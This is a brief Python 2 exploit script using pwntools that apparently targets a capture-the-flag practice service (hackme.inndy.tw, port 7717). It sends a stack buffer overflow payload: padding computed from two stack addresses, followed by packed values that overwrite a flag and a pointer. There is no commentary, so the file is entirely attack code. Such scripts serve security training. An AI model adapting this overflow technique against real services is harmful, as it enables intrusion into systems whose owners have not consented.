#!/usr/bin/env python2
from pwn import *
import pwnlib.elf
import pwnlib.shellcraft
import time

# init
c = remote('hackme.inndy.tw', 7717)

context.os='linux'
context.arch='amd64'

payload = p32(0x0) + 'a' * (0xffffd630 - 0xffffd57c) +p32(0x1) + p32(0x804a060)

print(c.recvline())
c.send(payload)

print(c.recv())
c.close()
